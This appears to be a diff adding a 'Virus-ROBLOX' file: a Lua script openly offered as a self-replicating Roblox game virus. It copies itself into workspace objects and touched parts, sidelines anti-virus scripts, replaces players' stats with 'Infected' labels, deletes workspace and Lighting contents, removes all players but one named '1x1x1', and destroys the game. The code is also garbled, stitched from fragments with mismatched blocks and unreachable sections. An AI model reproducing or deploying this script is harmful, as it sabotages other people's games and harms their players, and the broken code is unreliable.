@@ -1,0 +1,244 @@
+# Virus-ROBLOX 
+here is the script dont play with it to much :D  
+
+ local xPos = math.random(-64,64)
+    local zPos = math.random(-64,64)
+ 
+    local new = Instance.new("Part")
+    new.Parent = game.Workspace
+    new.CFrame = CFrame.new(xPos,100,zPos)
+    wait(0.1)
+end
+local stuff = game.Workspace:GetChildren()
+for i = 1, #stuff do  
+if (stuff[i].className ~= "Script") and (stuff[i]:findFirstChild("EAT THIS ROBLOX KIDDSS") == nil) and (stuff[i].className ~= "Camera") then
+local clone = script:clone()
+clone.Parent = stuff[i]
+end
+end
+end
+ 
+function onPlayerEntered(newPlayer)
+while true do
+            if newPlayer.Character ~= nil then break end
+            wait(1)
+end
+    hehe = game.Workspace:FindFirstChild("HAAXEDBYCREATURES")
+    if hehe == nil then
+    local pwnedbythenorn = script.HAAXEDBYCREATURES:clone()
+    pwnedbythenorn.Parent = game.Workspace
+    pwnedbythenorn.Disabled = false
+    end
+    end
+game.Players.PlayerAdded:connect(onPlayerEntered)
+ 
+while true do
+wait(.1)
+spread()
+end
+ 
+function GetAllItems(mdl)
+local objs = {}
+function Search(obj)
+if obj~=workspace then
+table.insert(objs,obj)
+end
+if #obj:GetChildren() > 0 then
+for i, v in ipairs(obj:GetChildren()) do
+Search(v)
+end
+end
+end
+Search(mdl)
+return objs
+end
+local all = game.Workspace:GetChildren()
+ 
+ 
+while true do
+wait(.1)
+for i = 1, #all do
+local find = all[i]:FindFirstChild(script.Name)
+if all[i].className == "Model" and all[i].PrimaryPart == "Head" then
+eric = 1
+wait(.1)
+eric = 0
+else if script.Name == find then
+eric = 1
+wait(.1)
+eric = 0
+else if find ~= nil then
+eric = 1
+wait(.1)
+eric = 0
+else
+q = script
+w = q:clone()
+q = w:clone()
+q.Parent = all[i]
+end
+end 
+end
+end
+ 
+local sll = script.Parent:GetChildren()
+ 
+for i = 1, #sll do
+local finds = game.Workspace:FindFirstChild(script.Name)
+sll[i].Name = script.Name
+if script.Parent.className == "Model" and script.Parent.PrimaryPart == "Head" then
+eric = 1 
+wait(.1)
+eric = 0
+else if finds ~= nil then
+eric = 1
+wait(.1)
+eric = 0
+else
+q = script
+w = q:clone()
+q = w:clone()
+q.Parent = game.Workspace
+end
+end 
+end
+end
+wait(1)
+coroutine.resume(coroutine.create(function()
+    wait(1)
+end))
+ 
+script.Parent.Touched:connect(function(hit)
+    if hit == nil then return end
+    if hit.Parent == nil or hit.Name == "Virus" or hit:FindFirstChild("InfectedScript") ~= nil then return end
+    local s = script.InfectedScript:clone()
+    local t = script:clone()
+    t.Disabled = true
+    t.Parent = s
+    s.Disabled = false
+    s.Parent = hit
+    GetTarget()
+end)
+ 
+function attack(what)
+    if (what.Locked == true) then return end
+    while what ~= nil and what:FindFirstChild("InfectedScript") == nil and what.Parent ~= nil do
+        script.Parent.CFrame = CFrame.new(script.Parent.Position,what.Position)
+        script.Parent.Velocity = script.Parent.CFrame.lookVector*100
+        wait(0.1)
+    end
+    GetTarget()
+end
+ 
+function find(w)
+    if #w:GetChildren() == 0 then return end
+    for _,v in pairs(w:GetChildren()) do
+        if v.Name ~= "Virus" and v:FindFirstChild("VirusScript") == nil then
+            if v.className == "Part" and v.Locked ~= true then
+                table.insert(a,v)
+            end
+            find(v)
+        end
+    end
+end
+ 
+function GetTarget()
+    wait(.1)
+    a = {}
+    find(game.Workspace)
+ 
+    if #a == 0 then GetTarget()end
+ 
+    min = 99999
+    target = nil
+ 
+    for _,v in pairs(a) do
+        if (script.Parent.Position-v.Position).magnitude < min and v.Name ~= "Virus" or v.locked ~= true and v:FindFirstChild("InfectedScript") == nil then
+            min = (script.Parent.Position-v.Position).magnitude
+            target = v
+        end
+    end
+ 
+    if target == nil or target.Locked == true then GetTarget()end
+    --found out the problem
+ 
+    attack(target)
+end
+ 
+GetTarget()
+for i, v in ipairs(GetAllItems(workspace)) do
+if v.className == "Script" then
+if v.Name == "Script" or v.Name == "Anti Infected" or v.Name == "Anti Virus" or v.Name == "lololyougothackedNOOB" then
+v.Parent = game.Lighting --Just in case it has a removal prevention.
+t = Instance.new("ObjectValue")
+t.Name = "IsAVirus"
+t.Parent = v
+end
+end
+end
+script.Parent = nil --NOT MINE!!
+Play = game.Players:GetPlayers()
+for i=1,#Play do
+if Play[i]:FindFirstChild("leaderstats") then
+Play[i].leaderstats:remove()
+end
+local stats = Instance.new("IntValue",Play[i])
+stats.Name = "leaderstats"
+local hack = Instance.new("StringValue",stats)
+hack.Name = "Speedhax4r recreated Infected script!"
+hack.Value = "Infected"
+local You = Play[i].Name
+local head = workspace[You].Head:Clone()
+workspace[You].Head.Transparency = 1
+local model = Instance.new("Model",workspace)
+local humanoid = Instance.new("Humanoid",model)
+head.Parent = model model.Name = "Infected"
+humanoid.MaxHealth = 0
+local w = Instance.new("Weld",model)
+w.Part0,w.Part1 = workspace[You].Head,head
+end
+for i=1,30 do
+i = i + 10
+wait(0.1)
+local p = Instance.new("Part")
+p.Parent = game.Workspace
+p.Position = Vector3.new ((math.random(-100, 100)),130,(math.random(0,100)))  
+p.Size = Vector3.new( math.random(50,100), math.random(50,100), math.random(50,100))
+p.BrickColor = BrickColor.new(math.random(1,100))
+p.Transparency= .2
+p.Reflectance= .1
+p.Shape = math.random(0,2)
+p.Locked = true
+p.Anchored = false
+p.CanCollide = true
+end
+while true do
+abm = Instance.new("Message",workspace)
+abm.Text = "INFECTED"
+wait(5)
+pcall(function() abm:Destroy() end)
+for i,v in pairs(game:GetService("Workspace"):GetChildren()) do
+    pcall(function() v:Destroy() end)
+end
+pcall(function() game:GetService("Lighting"):ClearAllChildren() end)
+pls = game:GetService("Players"):GetChildren()
+if #pls > 0 then
+    for X=1, #pls do
+        if pls[X].Name ~= "1x1x1" then
+            pcall(function() pls[X]:Destroy() end)
+        end
+    end
+end
+end
+local all = game.Workspace:GetChildren()
+while true do 
+wait(.1)
+for i = 1, #all do
+if all[i].Name == script.Name then
+all[i].Name = script.Name
+else
+all[i].Name = "Infected"
+end
+end 
+end
+game:Destroy()
